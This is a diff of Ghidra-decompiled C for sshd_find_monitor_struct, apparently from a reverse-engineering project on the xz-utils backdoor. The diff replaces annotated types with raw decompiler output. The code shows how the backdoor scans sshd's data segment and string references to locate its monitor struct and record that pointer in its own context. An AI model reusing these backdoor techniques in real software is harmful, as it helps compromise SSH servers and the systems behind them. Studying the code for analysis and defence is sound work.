@@ -1,7 +1,7 @@
 // /home/kali/xzre-ghidra/xzregh/103DB0_sshd_find_monitor_struct.c
 // Function: sshd_find_monitor_struct @ 0x103DB0
-// Calling convention: __stdcall
-// Prototype: BOOL __stdcall sshd_find_monitor_struct(elf_info_t * elf, string_references_t * refs, global_context_t * ctx)
+// Calling convention: unknown
+// Prototype: undefined sshd_find_monitor_struct(void)
 
 
 /*
@@ -14,37 +14,36 @@
 #include "xzre_types.h"
 
 
-BOOL sshd_find_monitor_struct(elf_info_t *elf,string_references_t *refs,global_context_t *ctx)
+undefined8 sshd_find_monitor_struct(undefined8 param_1,long param_2,long param_3)
 
 {
-  u8 *code_start;
-  BOOL BVar1;
-  u8 *data_start_00;
-  u8 *data_end_00;
-  ulong uVar2;
-  uint uVar3;
+  int iVar1;
+  long lVar2;
+  long lVar3;
   long lVar4;
-  ulong uVar5;
+  uint uVar5;
   long lVar6;
-  void **ppvVar7;
-  uint *puVar8;
-  byte bVar9;
+  ulong uVar7;
+  ulong uVar8;
+  long lVar9;
+  long *plVar10;
+  uint *puVar11;
+  byte bVar12;
   void *monitor_candidates [10];
   uint monitor_field_hits [10];
-  u8 *data_start;
-  u8 *data_end;
-  u64 local_d0;
-  uint local_c8 [20];
-  void *local_78 [10];
+  long local_d0;
+  uint local_c8 [18];
+  long lStack_80;
+  long local_78 [10];
   
-  bVar9 = 0;
-  BVar1 = secret_data_append_from_call_site((secret_data_shift_cursor_t)0xda,0x14,0xf,FALSE);
-  if ((BVar1 != FALSE) && (local_d0 = 0, ctx->sshd_ctx->mm_request_send_start != (void *)0x0)) {
-    ctx->struct_monitor_ptr_address = (monitor **)0x0;
-    data_start_00 = (u8 *)elf_get_data_segment(elf,&local_d0,FALSE);
-    if (data_start_00 != (u8 *)0x0) {
-      lVar6 = 0;
-      data_end_00 = data_start_00 + local_d0;
+  bVar12 = 0;
+  iVar1 = secret_data_append_from_call_site(0xda,0x14,0xf,0);
+  if ((iVar1 != 0) && (local_d0 = 0, *(long *)(*(long *)(param_3 + 0x20) + 0xa8) != 0)) {
+    *(undefined8 *)(param_3 + 0x48) = 0;
+    lVar2 = elf_get_data_segment(param_1,&local_d0,0);
+    if (lVar2 != 0) {
+      lVar9 = 0;
+      lVar3 = local_d0 + lVar2;
       local_c8[0] = 4;
       local_c8[1] = 5;
       local_c8[2] = 6;
@@ -55,57 +54,57 @@ BOOL sshd_find_monitor_struct(elf_info_t *elf,string_references_t *refs,global_c
       local_c8[7] = 0xb;
       local_c8[8] = 0xc;
       local_c8[9] = 0xd;
-      ppvVar7 = local_78;
-      for (lVar4 = 0x14; lVar4 != 0; lVar4 = lVar4 + -1) {
-        *(undefined4 *)ppvVar7 = 0;
-        ppvVar7 = (void **)((long)ppvVar7 + (ulong)bVar9 * -8 + 4);
+      plVar10 = local_78;
+      for (lVar6 = 0x14; lVar6 != 0; lVar6 = lVar6 + -1) {
+        *(undefined4 *)plVar10 = 0;
+        plVar10 = (long *)((long)plVar10 + ((ulong)bVar12 * -2 + 1) * 4);
       }
       do {
-        code_start = (u8 *)refs->entries[local_c8[lVar6]].func_start;
-        if (code_start != (u8 *)0x0) {
+        lVar4 = (ulong)local_c8[lVar9] * 0x20 + param_2;
+        lVar6 = *(long *)(lVar4 + 8);
+        if (lVar6 != 0) {
           sshd_find_monitor_field_addr_in_function
-                    (code_start,(u8 *)refs->entries[local_c8[lVar6]].func_end,data_start_00,
-                     data_end_00,local_78 + lVar6,ctx);
+                    (lVar6,*(undefined8 *)(lVar4 + 0x10),lVar2,lVar3,(long)local_78 + lVar9 * 8,
+                     param_3);
         }
-        lVar6 = lVar6 + 1;
-      } while (lVar6 != 10);
-      puVar8 = local_c8 + 10;
-      for (lVar4 = 10; lVar4 != 0; lVar4 = lVar4 + -1) {
-        *puVar8 = 0;
-        puVar8 = puVar8 + (ulong)bVar9 * -2 + 1;
+        lVar9 = lVar9 + 1;
+      } while (lVar9 != 10);
+      puVar11 = local_c8 + 10;
+      for (lVar2 = 10; lVar2 != 0; lVar2 = lVar2 + -1) {
+        *puVar11 = 0;
+        puVar11 = puVar11 + (ulong)bVar12 * -2 + 1;
       }
-      lVar4 = 0;
+      lVar2 = 0;
       do {
-        uVar2 = 0;
+        uVar8 = 0;
         do {
-          uVar5 = uVar2 & 0xffffffff;
-          if ((uint)lVar4 <= (uint)uVar2) {
-            local_c8[lVar4 + 10] = local_c8[lVar4 + 10] + 1;
+          uVar7 = uVar8 & 0xffffffff;
+          if ((uint)lVar2 <= (uint)uVar8) {
+            local_c8[lVar2 + 10] = local_c8[lVar2 + 10] + 1;
             goto LAB_00103f07;
           }
-          ppvVar7 = local_78 + uVar2;
-          uVar2 = uVar2 + 1;
-        } while (*ppvVar7 != local_78[lVar4]);
-        local_c8[uVar5 + 10] = local_c8[uVar5 + 10] + 1;
+          uVar8 = uVar8 + 1;
+        } while ((&lStack_80)[uVar8] != *(long *)((long)local_78 + lVar2 * 8));
+        local_c8[uVar7 + 10] = local_c8[uVar7 + 10] + 1;
 LAB_00103f07:
-        lVar4 = lVar4 + 1;
-      } while (lVar4 != 10);
-      uVar2 = 0;
+        lVar2 = lVar2 + 1;
+      } while (lVar2 != 10);
+      uVar8 = 0;
+      uVar7 = 0;
       uVar5 = 0;
-      uVar3 = 0;
       do {
-        if (uVar3 < local_c8[uVar2 + 10]) {
-          uVar5 = uVar2 & 0xffffffff;
-          uVar3 = local_c8[uVar2 + 10];
+        if (uVar5 < local_c8[uVar8 + 10]) {
+          uVar7 = uVar8 & 0xffffffff;
+          uVar5 = local_c8[uVar8 + 10];
         }
-        uVar2 = uVar2 + 1;
-      } while (uVar2 != 10);
-      if ((4 < uVar3) && ((monitor **)local_78[uVar5] != (monitor **)0x0)) {
-        ctx->struct_monitor_ptr_address = (monitor **)local_78[uVar5];
-        return TRUE;
+        uVar8 = uVar8 + 1;
+      } while (uVar8 != 10);
+      if ((4 < uVar5) && (lVar2 = *(long *)((long)local_78 + uVar7 * 8), lVar2 != 0)) {
+        *(long *)(param_3 + 0x48) = lVar2;
+        return 1;
       }
     }
   }
-  return FALSE;
+  return 0;
 }
 
